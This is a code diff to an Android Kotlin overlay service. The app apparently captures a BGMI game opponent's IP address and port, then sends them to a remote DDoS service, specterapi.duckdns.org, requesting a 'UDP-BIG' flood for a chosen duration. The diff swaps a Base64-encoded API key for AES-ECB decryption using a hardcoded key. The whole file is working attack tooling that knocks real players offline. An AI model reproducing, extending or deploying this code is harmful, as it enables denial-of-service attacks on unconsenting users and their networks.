@@ -15,6 +15,8 @@ import android.view.WindowManager
 import android.widget.*
 import java.net.HttpURLConnection
 import java.net.URL
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
 
 class FloatingService : Service() {
     private lateinit var windowManager: WindowManager
@@ -22,10 +24,10 @@ class FloatingService : Service() {
     private lateinit var etIp: EditText
     private lateinit var etPort: EditText
     private lateinit var tvTime: TextView
-    private lateinit var tvLog: TextView
     private lateinit var btnAttack: Button
     private lateinit var btnGetIp: Button
     private var selectedTime = 120
+    private val SECRET_KEY = "JadugarSecretKey1234567890123456"
 
     companion object {
         var instance: FloatingService? = null
@@ -37,9 +39,10 @@ class FloatingService : Service() {
             Handler(Looper.getMainLooper()).post {
                 etIpRef?.setText(ip)
                 etPortRef?.setText(port)
-                btnGetIpRef?.text = "IP FOUND ✅"
-                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
-                Toast.makeText(instance, "BGMI IP Caught!", Toast.LENGTH_SHORT).show()
+                btnGetIpRef?.text = "IP CAUGHT ✅"
+                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#00FFCC"))
+                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
+                Toast.makeText(instance, "BGMI IP Found!", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -63,14 +66,11 @@ class FloatingService : Service() {
         floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)
         windowManager.addView(floatingView, params)
 
-        // YAHAN TYPE SPECIFY KIYA HAI TAAPI ERROR NA AAYE
-        etIp = floatingView.findViewById<EditText>(R.id.fEtIp)
-        etPort = floatingView.findViewById<EditText>(R.id.fEtPort)
-        tvTime = floatingView.findViewById<TextView>(R.id.fTvTime)
-        tvLog = floatingView.findViewById<TextView>(R.id.tvLog)
-        btnAttack = floatingView.findViewById<Button>(R.id.fBtnAttack)
-        btnGetIp = floatingView.findViewById<Button>(R.id.fBtnGetIp)
-        val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
+        etIp = floatingView.findViewById(R.id.fEtIp)
+        etPort = floatingView.findViewById(R.id.fEtPort)
+        tvTime = floatingView.findViewById(R.id.fTvTime)
+        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
+        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
         val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
         val btnClose = floatingView.findViewById<TextView>(R.id.btnClose)
 
@@ -83,15 +83,13 @@ class FloatingService : Service() {
         seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
             override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                 selectedTime = 60 + (progress * 10) 
-                tvTime.text = "SESSION DURATION: ${selectedTime}s"
+                tvTime.text = "TIME: ${selectedTime}s"
             }
             override fun onStartTrackingTouch(seekBar: SeekBar?) {}
             override fun onStopTrackingTouch(seekBar: SeekBar?) {}
         })
 
         btnGetIp.setOnClickListener {
-            tvLog.text = "> SNIFFING VPN..."
-            tvLog.setTextColor(android.graphics.Color.parseColor("#FBBF24"))
             btnGetIp.text = "SNIFFING..."
             btnGetIp.isEnabled = false
             
@@ -104,72 +102,63 @@ class FloatingService : Service() {
             }
         }
 
-        btnVpnOff.setOnClickListener {
-            stopService(Intent(this, VpnService::class.java))
-            tvLog.text = "> VPN STOPPED"
-            tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
-            btnGetIp.text = "GET IP"
-            btnGetIp.isEnabled = true
-            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1E1E1E"))
-        }
-
         btnAttack.setOnClickListener {
             val ip = etIp.text.toString().trim()
             val port = etPort.text.toString().trim()
             if (ip.isEmpty() || port.isEmpty()) {
-                Toast.makeText(this, "IP or Port missing!", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "Enter IP and Port!", Toast.LENGTH_SHORT).show()
                 return@setOnClickListener
             }
             btnAttack.text = "LAUNCHING..."
             btnAttack.isEnabled = false
-            tvLog.text = "> ATTACK SENT [${selectedTime}s]"
-            
-            fireDirectAttack(ip, port, selectedTime)
+            executeAttack(ip, port, selectedTime)
         }
     }
 
-    private fun fireDirectAttack(ip: String, port: String, time: Int) {
+    private fun executeAttack(ip: String, port: String, time: Int) {
         Thread {
             try {
                 val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
-                val decryptedApiKey = String(Base64.decode("c3BfbGl2ZV8wNjVhMzE4MDc4ZjNlZmMxOWUwYmU3MjAxMDJlOWE3ZQ==", Base64.DEFAULT))
+                // API Key Decrypt at Runtime
+                val encryptedKey = "Z0Z4Z2R5R2R5R2R5..." // Yahan Encrypt karke daalna hoga (Read Below)
+                val apiKey = decryptApiKey(encryptedKey)
 
                 val url = URL(apiUrl)
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("x-api-key", decryptedApiKey)
+                conn.setRequestProperty("x-api-key", apiKey)
                 conn.doOutput = true
-                conn.connectTimeout = 5000
-                conn.readTimeout = 5000
 
                 val jsonInput = """{"target":"$ip","port":$port,"duration":$time,"method":"UDP-BIG"}"""
                 conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }
 
-                val responseCode = conn.responseCode
-                
                 Handler(Looper.getMainLooper()).post {
-                    if (responseCode == 200 || responseCode == 201) {
-                        btnAttack.text = "LAUNCHED! ✅"
-                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
-                        tvLog.text = "> SUCCESS! TARGET DOWN"
-                        Toast.makeText(this@FloatingService, "Attack Success!", Toast.LENGTH_SHORT).show()
+                    if (conn.responseCode in 200..201) {
+                        btnAttack.text = "ATTACK FIRED ✅"
+                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#00FFCC"))
+                        btnAttack.setTextColor(android.graphics.Color.BLACK)
                     } else {
-                        btnAttack.text = "LAUNCH 🚀"
+                        btnAttack.text = "LAUNCH FAILED ❌"
                         btnAttack.isEnabled = true
-                        tvLog.text = "> ERROR: $responseCode"
-                        tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                     }
                 }
             } catch (e: Exception) {
                 Handler(Looper.getMainLooper()).post {
-                    btnAttack.text = "LAUNCH 🚀"
+                    btnAttack.text = "ERROR ❌"
                     btnAttack.isEnabled = true
-                    tvLog.text = "> NETWORK FAIL"
-                    tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                 }
             }
         }.start()
+    }
+
+    private fun decryptApiKey(encrypted: String): String {
+        return try {
+            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
+            val keySpec = SecretKeySpec(SECRET_KEY.toByteArray(), "AES")
+            cipher.init(Cipher.DECRYPT_MODE, keySpec)
+            String(cipher.doFinal(Base64.decode(encrypted, Base64.DEFAULT)))
+        } catch (e: Exception) { "" }
     }
 
     override fun onDestroy() {
